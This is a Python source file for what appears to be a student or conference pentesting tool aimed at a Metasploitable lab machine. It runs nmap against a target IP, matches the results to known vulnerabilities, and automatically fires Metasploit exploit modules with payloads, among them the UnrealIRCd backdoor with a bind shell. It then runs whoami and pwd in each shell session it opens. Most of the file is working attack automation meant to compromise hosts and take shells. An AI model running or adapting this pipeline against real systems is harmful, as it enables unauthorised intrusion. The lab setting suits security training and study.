# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

from pymetasploit3.msfrpc import *
import time
import utils
import sys
import nmap_dest
import re
import subprocess
import os
from knownVulnerabilities import vulnerabilities
import tkinter as tk
import tkinter.messagebox
from tkinter import simpledialog

initial_setup_done = False
server_setup_done = False

# Script that sets up msfconsole RPC server
def run_setup_script():
    global initial_setup_done, setup_button
    if not initial_setup_done:
        subprocess.Popen(["./setup.sh"], shell=True)
        initial_setup_done = True
        setup_button.config(state="disabled")
        
        # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Setup in Progress")
        message = tk.Label(popup, text="Initial setup started, please wait 3 minutes. \nThis window will close automatically once it's done! \n\nNote: you will need to input your password in terminal to properly run the sudo commands.\n\n Note: If it says you have the requirements already then feel free to close this window and move on.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
            tk.messagebox.showinfo("Initial Setup Script", "Initial setup completed, startup your server and have fun.")

        # Schedule the popup to close after 180 seconds (3 minutes)
        popup.after(180000, close_popup)
        

# Script that sets up msfconsole RPC server
def run_server_script():
    global server_setup_done, server_button
    if not server_setup_done:
        subprocess.Popen(["./server.sh"], shell=True)
        server_setup_done = True
        server_button.config(state="disabled")
        time.sleep(10) # waits for the server.sh sleep to finish
        tk.messagebox.showinfo("Setup Server Script", "Metasploit RPC server setup completed.")


def retrieve_input():
    # Get the input from the entry widget
    input_value = entry.get()
    try:
        # Convert to integer and validate range
        aggressiveness = int(input_value)
        if 0 <= aggressiveness <= 5:
            # Call your Nmap scan function here with aggressiveness
            print(f"Running Nmap scan with aggressiveness {aggressiveness}")
        else:
            print("Please enter a valid number between 0 and 5. Note that higher is faster but more detectable.")
    except ValueError:
        print("Please enter a valid integer.")


# Create the GUI
root = tk.Tk()
root.title("Bootcon Pentesting Tool GUI v0.1")

##### Create widgets here #####

# Button to run initial setup script
setup_button = tk.Button(root, text="Run Initial Setup", command=run_setup_script)
setup_button.pack()

# Button to run server script
server_button = tk.Button(root, text="Run Server Setup", command=run_server_script)
server_button.pack()

# Input for aggressiveness of Nmap scan
label = tk.Label(root, text="Enter the aggressiveness of the nmap scan (0-5):")
label.pack()

entry = tk.Entry(root)
entry.pack()

button = tk.Button(root, text="Submit", command=retrieve_input)
button.pack()

# Run the application
root.mainloop()

# We need to set the bellow to be called via the GUI

if __name__ == "__main__":
    #############################################################################
    ### UNCOMMENT THIS TO RUN THE PROGRAM, THEN COMMENT THIS OUT ONCE YOU RUN THE 
    # PROGRAM ONCE, this must run every time you restart computer ###
    # proc1 = subprocess.Popen(["./setup.sh"])
    # time.sleep(180)
    # proc1.kill()
    ### COMMENT THIS OUT ONCE YOU RUN THE PROGRAM ONCE, must run every time you restart computer###

    # basically starts metasploit and kill all previous sessions 
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("session list =", client.sessions.list)

    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
    vulnerability = vulnerabilities[3]
    print(vulnerability.description)
    print(vulnerability.module)
    RHOSTS = "192.168.1.162" # PUT YOUR HOST HERE
    module = vulnerability.module
    exploit = client.modules.use(vulnerability.exploitType, module)
    print(exploit)
    # options = exploit.options
    missingOptions = exploit.missing_required
    if 'RHOSTS' in missingOptions:
        print(RHOSTS)
        exploit['RHOSTS'] = RHOSTS
    print("missing options:", exploit.missing_required)
    if vulnerability.payload:
        print("payload:", vulnerability.payload)
        exploit.execute(payload=vulnerability.payload)
    else:
        print("no payload")
        exploit.execute()
    time.sleep(vulnerability.sleep)
    print(client.sessions.list)
    exit()
    ######### TEST

    ######## RECONAISSANCE PHASE ########
    RHOSTS = "192.168.1.162"
    nmapAggressiveness = 2
    # in order of increasing levels of fucking around (and also in increasing levels of finding out)
    nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
    nmapArgs = nmapPossibleArgs[nmapAggressiveness]
    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
    print(output)
    if (output[1][0:22] == "Note: Host seems down."):
        print("Host seems down. Exiting.")
        exit()

    ######## WEAPONIZATION PHASE ########
    vulnerabilitiesToUse = set()
    for line in output:
        # Detect what keywords each line of the nmap output contains and compare those to the descriptions
        # for each known vulnerability and if all key words of a vulnerability are found, add it to the exploit list
        for vulnerability in vulnerabilities:
            keyWordsFoundCount = 0
            flag = None
            if vulnerability.caseSensitiveKeyTermMatch:
                flag = 0
            else:
                flag = re.IGNORECASE
            # TODO: make it so there is a list of optional or guaranteed key terms
            for keyword in vulnerability.keywords:
                if re.search(keyword, line, flag):
                    keyWordsFoundCount += 1
            if keyWordsFoundCount < vulnerability.minKeyTermsThatMustMatch:
                continue
            if not vulnerability in vulnerabilitiesToUse:
                vulnerabilitiesToUse.add(vulnerability)
                print("*********", vulnerability.description, "EXPLOIT FOUND *********")

    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    # exploit = client.modules.use(vulnerability.exploitType, 'unix/irc/unreal_ircd_3281_backdoor')
    # exploit['RHOSTS'] = RHOSTS
    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
    # exploit.execute(payload='cmd/unix/bind_ruby')
    for vulnerability in vulnerabilitiesToUse:
        module = vulnerability.module
        exploit = client.modules.use(vulnerability.exploitType, module)
        # options = exploit.options
        missingOptions = exploit.missing_required
        print("######## EXPLOITING", vulnerability.description, "########")
        if 'RHOSTS' in missingOptions:
            exploit['RHOSTS'] = RHOSTS
        if vulnerability.payload:
            exploit.execute(payload=vulnerability.payload)
        else:
            exploit.execute()
        time.sleep(vulnerability.sleep)
        numSessions = 0
        for k in client.sessions.list.keys():
            numSessions += 1
        print("Total number of sessions created:", numSessions)
        # # if we have a session established, leave
        # for _session in client.sessions.list.keys():
        #     break
    
    ####### Print some info on the sessions created
    print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
    sessions = client.sessions.list
    numSessions = 0
    for k in client.sessions.list.keys():
        numSessions += 1
    print("Number of sessions created:", numSessions)

    for k in client.sessions.list.keys():
        shell = client.sessions.session(str(k))
        shell.write('whoami')
        shell.write('pwd')
        print(shell.read())

    print()
    